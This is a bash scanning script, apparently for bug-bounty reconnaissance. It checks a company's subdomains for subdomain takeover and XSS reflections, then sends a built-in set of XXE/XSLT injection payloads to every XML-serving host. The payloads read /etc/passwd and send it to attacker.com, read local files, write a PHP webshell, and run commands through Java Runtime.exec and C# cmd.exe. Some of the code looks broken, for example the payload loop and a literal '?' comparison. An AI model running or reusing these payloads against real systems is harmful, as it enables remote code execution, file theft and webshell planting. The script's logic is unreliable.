#!/bin/bash

# ================================
# INJECTION VULNERABILITY SCANNER
# (Keep only: SUBDOMAIN TAKEOVER, XSS, CRLF)
# ================================

# Usage: ./injections.sh <company>
if [ $# -ne 1 ]; then
    echo "Usage: $0 <company>"
    exit 1
fi

COMPANY="$1"
BASE_DIR="/root/Desktop/BB/recon/$COMPANY"
FINAL_SUBDOMAINS="${BASE_DIR}/data/subdomains/final_subdomains.txt"
HTTPX_SUBS_WITH_HTTP_HTTPS="$BASE_DIR/data/subdomains_organized/httpx_final_subs_with_http-https.txt"
FINAL_ALL_ARCHIVE="$BASE_DIR/data/archive_data_subs/final_all_archive.txt"

# =====================
# 🔹 SUBDOMAIN TAKEOVER
# =====================
echo "[*] Running subdomain takeover check..."
mkdir -p "$BASE_DIR/subdomain_takeover"
subzy run --targets "$FINAL_SUBDOMAINS" --concurrency 10 > "$BASE_DIR/subdomain_takeover/subdomain_takeover_urls.txt"
echo "[✔] Subdomain takeover check completed."

# -------------------
# 🔹 1. XSS Reflections
# -------------------
mkdir -p "$BASE_DIR/injection_vulns/XSS"
echo "[*] Running KXSS on final_all_archive.txt for $COMPANY..."
cat "$FINAL_ALL_ARCHIVE" | grep "=" | kxss > "$BASE_DIR/injection_vulns/XSS/XSS_reflections.txt"
echo "[*] KXSS completed."
echo ""

# ========================
# INPUT VALIDATION
# ========================
INPUT_FOR_CRLF="$HTTPX_SUBS_WITH_HTTP_HTTPS"

if [[ ! -s "$INPUT_FOR_CRLF" ]]; then
  echo "Error: INPUT_FOR_CRLF not found or empty: $INPUT_FOR_CRLF"
  exit 1
fi

# keep normalize helper (used elsewhere in full script)
normalize(){
  cat | grep "=" | while read -r url; do
    if [[ "$url" == *"="* ]]; then
      if [[ "$url" == *"?"* ]]; then
        base="${url%%\?*}"; query="${url#*\?}"
        IFS='&' read -ra params <<< "$query"
        for i in "${!params[@]}"; do
          k="${params[i]%%=*}"; params[i]="$k=FUZZ"
        done
        echo "$base?$(IFS='&'; echo "${params[*]}")"
      else
        IFS='&' read -ra params <<< "$url"
        for i in "${!params[@]}"; do
          k="${params[i]%%=*}"; params[i]="$k=FUZZ"
        done
        echo "$(IFS='&'; echo "${params[*]}")"
      fi
    else
      echo "$url"
    fi
  done | sort -u
}


# ========================
# Filtered param-only-urls for injection vulns (Manual)
# ========================
cat "$FINAL_ALL_ARCHIVE"  |  grep "=" | sort -u | while IFS= read -r url; do
  if [[ "$url" == "?" ]]; then
    base="${url%%\?}"; query="${url#\?}"
    IFS='&' read -ra params <<< "$query"
    for i in "${!params[@]}"; do
      k="${params[i]%%=*}"; params[i]="$k=FUZZ"
    done
    printf '%s\n' "$base?$(IFS='&'; echo "${params[*]}")"
  else
    IFS='&' read -ra params <<< "$url"
    for i in "${!params[@]}"; do
      k="${params[i]%%=*}"; params[i]="$k=FUZZ"
    done
    printf '%s\n' "$(IFS='&'; echo "${params[*]}")"
  fi
done | sort -u > "$BASE_DIR/injection_vulns/param-only-urls_for_injection_vulns-manual.txt"

# ========================
# Filtering xml content type subdomains

mkdir -p "$BASE_DIR/injection_vulns/XXE"
cat "$BASE_DIR/data/httpx_subdomains/httpx_final_subs-subs_with_ports_unfiltered.txt" | grep "xml" | awk '{print $1}' | sort -u > "$BASE_DIR/injection_vulns/XXE/xml_data-format_subdomains.txt"

# Filtering xml content type ips
cat "$BASE_DIR/data/httpx_ips/httpx_final_ips-ips_with_ports_unfiltered.txt" | grep "xml" | awk '{print $1}' | sort -u > "$BASE_DIR/injection_vulns/XXE/xml_data-format_ips.txt"

SUBS_FILE="$BASE_DIR/injection_vulns/XXE/xml_data-format_subdomains.txt"
IPS_FILE="$BASE_DIR/injection_vulns/XXE/xml_data-format_ips.txt"

SUBS_FILE="$BASE_DIR/injection_vulns/XXE/xml_data-format_subdomains.txt"
IPS_FILE="$BASE_DIR/injection_vulns/XXE/xml_data-format_ips.txt"

# ========================
# XXE Payloads inline (all included)
# ========================
read -r -d '' PAYLOADS <<'PAY'
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
---------------
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
---------------
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    Fruits:
     <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
---------------
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
---------------
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
  </xsl:template>
</xsl:stylesheet>
---------------
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>
---------------
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>
---------------
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
</xsl:stylesheet>
---------------
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- BEGIN COMMAND OUTPUT ---
 <xsl:value-of select="user:execute()"/>
  --- END COMMAND OUTPUT --- 
  </xsl:template>
</xsl:stylesheet>
PAY

# ========================
# Execute XXE Payloads
# ========================
printf '%s' "$PAYLOADS" | awk 'BEGIN{RS="---------------";ORS=""}{gsub(/^\s+|\s+$/,"");if(length($0))print "---PAY---\n"$0"\n"}' | \
while IFS= read -r block; do
  [[ "$block" == ---PAY---* ]] || continue
  payload="${block#---PAY---$'\n'}"

  check_xxe() {
    url="$1"
    resp=$(curl -s -X POST "$url" -H "Content-Type: application/xml" -d "$payload")
    if echo "$resp" | grep -qE "root:x|/bin/bash|etc/passwd|[Ww]in\.ini|C:\\Windows|Directory of|BEGIN COMMAND OUTPUT|webshell\.php|PHP Notice|Index of /|127\.0\.0\.1|localhost|ping"; then
      echo "[XXE FOUND] $url"
    fi
  }

  [ -f "$SUBS_FILE" ] && while IFS= read -r url; do
    [ -n "$url" ] && echo "[*] Testing $url" && check_xxe "$url"
  done < "$SUBS_FILE"

  [ -f "$IPS_FILE" ] && while IFS= read -r url; do
    [ -n "$url" ] && echo "[*] Testing $url" && check_xxe "$url"
  done < "$IPS_FILE"
done
